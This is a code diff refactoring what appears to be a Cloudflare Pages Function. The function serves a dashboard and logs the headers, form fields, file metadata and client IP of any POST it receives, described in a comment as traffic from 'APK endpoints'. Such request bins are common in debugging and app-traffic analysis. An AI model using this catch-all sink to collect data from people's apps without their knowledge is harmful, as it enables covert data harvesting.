@@ -98,80 +98,92 @@ load();
 </body>
 </html>`;
 
-export const onRequestGet = async ({ request }) => {
+export async function onRequest(context) {
+  const { request } = context;
   const url = new URL(request.url);
+  const method = request.method;
 
+  // Root - dashboard
   if (url.pathname === '/' || url.pathname === '') {
+    if (method !== 'GET') {
+      return new Response('Method not allowed', { status: 405 });
+    }
     return new Response(DASHBOARD_HTML, {
       headers: { 'content-type': 'text/html; charset=utf-8' }
     });
   }
 
+  // API: get captures
   if (url.pathname === '/api/captures') {
+    if (method !== 'GET') {
+      return new Response('Method not allowed', { status: 405 });
+    }
     return Response.json(captures);
   }
 
-  return new Response('Not found', { status: 404 });
-};
-
-export const onRequestPost = async ({ request }) => {
-  const url = new URL(request.url);
-
+  // API: clear captures
   if (url.pathname === '/api/clear') {
+    if (method !== 'POST') {
+      return new Response('Method not allowed', { status: 405 });
+    }
     captures = [];
     return Response.json({ ok: true });
   }
 
-  // Koi bhi POST request capture karein (APK endpoints ke liye)
-  const contentType = request.headers.get('content-type') || '';
-  let bodyPreview = null;
-  let fields = {};
-  let files = [];
+  // Any POST - capture data (APK endpoints)
+  if (method === 'POST') {
+    const contentType = request.headers.get('content-type') || '';
+    let bodyPreview = null;
+    let fields = {};
+    let files = [];
 
-  try {
-    if (contentType.includes('multipart/form-data')) {
-      const formData = await request.formData();
-      for (const [key, value] of formData.entries()) {
-        if (value instanceof File) {
-          files.push({
-            fieldname: key,
-            originalname: value.name,
-            mimetype: value.type,
-            size: value.size
-          });
-          fields[key] = `[FILE] ${value.name}`;
-        } else {
+    try {
+      if (contentType.includes('multipart/form-data')) {
+        const formData = await request.formData();
+        for (const [key, value] of formData.entries()) {
+          if (value instanceof File) {
+            files.push({
+              fieldname: key,
+              originalname: value.name,
+              mimetype: value.type,
+              size: value.size
+            });
+            fields[key] = `[FILE] ${value.name}`;
+          } else {
+            fields[key] = value;
+          }
+        }
+        bodyPreview = JSON.stringify(fields, null, 2);
+      } else {
+        const text = await request.text();
+        bodyPreview = text;
+        const params = new URLSearchParams(text);
+        for (const [key, value] of params) {
           fields[key] = value;
         }
       }
-      bodyPreview = JSON.stringify(fields, null, 2);
-    } else {
-      const text = await request.text();
-      bodyPreview = text;
-      const params = new URLSearchParams(text);
-      for (const [key, value] of params) {
-        fields[key] = value;
-      }
+    } catch (e) {
+      bodyPreview = '[parse error] ' + String(e);
     }
-  } catch (e) {
-    bodyPreview = '[parse error] ' + String(e);
+
+    const cap = {
+      id: Date.now() + '-' + Math.random().toString(36).slice(2, 8),
+      time: new Date().toISOString(),
+      method: 'POST',
+      path: url.pathname,
+      query: Object.fromEntries(url.searchParams),
+      headers: Object.fromEntries(request.headers.entries()),
+      body: bodyPreview,
+      fields: fields,
+      files: files,
+      ip: request.headers.get('cf-connecting-ip')
+    };
+
+    captures.unshift(cap);
+    if (captures.length > MAX_CAPTURES) captures.pop();
+
+    return Response.json({ status: 'ok' });
   }
 
-  const cap = {
-    id: Date.now() + '-' + Math.random().toString(36).slice(2, 8),
-    time: new Date().toISOString(),
-    method: 'POST',
-    path: url.pathname,
-    query: Object.fromEntries(url.searchParams),
-    headers: Object.fromEntries(request.headers.entries()),
-    body: bodyPreview,
-    fields: fields,
-    files: files,
-    ip: request.headers.get('cf-connecting-ip')
-  };
-
-  captures.unshift(cap);
-  if (captures.length > MAX_CAPTURES) captures.pop();
-
-  return Response.json({ status: 'ok' });
-};
+  return new Response('Not found', { status: 404 });
+}
